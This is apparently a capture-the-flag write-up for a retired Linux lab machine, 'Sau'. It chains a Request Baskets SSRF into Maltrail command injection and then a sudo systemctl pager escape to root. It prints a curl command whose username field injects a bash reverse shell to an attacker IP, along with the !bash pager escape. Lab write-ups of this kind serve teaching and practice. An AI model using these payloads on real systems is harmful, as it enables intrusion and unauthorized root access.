# Sau

![OS](https://img.shields.io/badge/OS-Linux-333333?style=flat-square&logo=linux&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square) ![Released](https://img.shields.io/badge/Released-2023--07--08-informational?style=flat-square)

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **Release** | July 8, 2023 |
| **Rating** | 4.6 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

Request Baskets v1.2.1 on port 55555 is vulnerable to **CVE-2023-27163** (SSRF): a basket's `forward_url` can point at internal services, proxying requests to a Maltrail v0.53 instance on localhost:80. Maltrail's login handler passes the `username` parameter to a shell unsanitised, giving an unauthenticated reverse shell as `puma`. Root is a `sudo` rule for `systemctl status trail.service` — `systemctl` pages long output through `less`, and `less` escapes to a shell with `!bash`.

---

## Recon

### Port Scan
```bash
nmap -sC -sV -T4 <TARGET_IP> -oN nmap-quick.txt
```
Key findings:
- Port 22: SSH OpenSSH 8.2p1
- Port 55555: HTTP (unknown service, likely custom app)

### Service Enumeration
Port 55555 hosts Request Baskets v1.2.1 - a web service for creating HTTP request collection baskets.

---

## Foothold

### Vulnerability Chain

**Primary Vulnerability: Request Baskets SSRF (CVE-2023-27163)**
- **Type**: Server-Side Request Forgery
- **Service**: Request Baskets v1.2.1
- **Discovery Method**: Version fingerprinting + searchsploit

**Secondary Vulnerability: Maltrail unauthenticated RCE**
- **Type**: Unauthenticated OS command injection
- **Service**: Maltrail v0.53 (internal service)
- **Discovery Method**: SSRF enumeration revealed internal service

### Exploitation

**Step 1: SSRF to Access Internal Maltrail**
```bash
# Create basket with forwarding URL pointing to internal Maltrail instance
# Request Baskets allows configuration of forward_url to internal services
# Access http://<TARGET_IP>:55555/[basket] which proxies to http://127.0.0.1:80
```

**Step 2: Maltrail RCE via Username Injection**
```bash
# Maltrail v0.53 has command injection in username parameter
# Inject payload in username field during login attempt
curl 'http://<TARGET_IP>:55555/[basket]/login' \
  --data 'username=;bash -c "bash -i >& /dev/tcp/10.10.14.X/9001 0>&1"'
```

### Shell Obtained
- **User**: puma
- **Access Method**: Reverse shell via command injection

---

## User Flag

### Path to User
Direct access after foothold as puma user.

### Flag
```
[flag redacted]
```

---

## Privilege Escalation

### Enumeration
```bash
sudo -l
```
Output:
```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

### Vulnerability
- **Type**: Sudo privilege abuse via pager escape
- **Discovery Method**: sudo -l enumeration

The `systemctl status` command spawns a `less` pager when output is long enough. The `less` pager allows command execution via the `!` escape sequence.

### Exploitation
```bash
# Run systemctl status with sudo
sudo /usr/bin/systemctl status trail.service

# In the less pager, press:
!bash
# This spawns a root shell
```

---

## Root Flag

### Path to Root
`sudo systemctl status` → less pager → `!bash` → root shell

### Flag
```
[flag redacted]
```

---

## Attack Chain Summary
```
Port 55555 (Request Baskets v1.2.1) → CVE-2023-27163 (SSRF) → Access Internal Maltrail v0.53 → username command injection → Shell as puma → sudo systemctl status → less pager escape → Root
```

## Tools Used
- nmap: Port scanning and service enumeration
- curl: Exploit delivery for both SSRF and command injection
- nc: Reverse shell listener

## Dead Ends
None encountered - straightforward CVE chain.

## Key Techniques
- **SSRF via Request Baskets**: Proxying requests to internal services via basket forwarding
- **Command Injection in Web Login**: Username parameter not sanitized in Maltrail
- **Pager Escape**: Abusing less pager spawned by systemctl status for privilege escalation
- **Two-CVE Chain**: SSRF enabling access to second vulnerable service

## Lessons Learned
- What worked well: Version fingerprinting immediately revealed both CVEs
- What wasted time: Nothing - clean speed-run
- Key takeaway for future machines: Request collection/proxy services are prime SSRF candidates; systemctl status with sudo is a known privesc vector

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
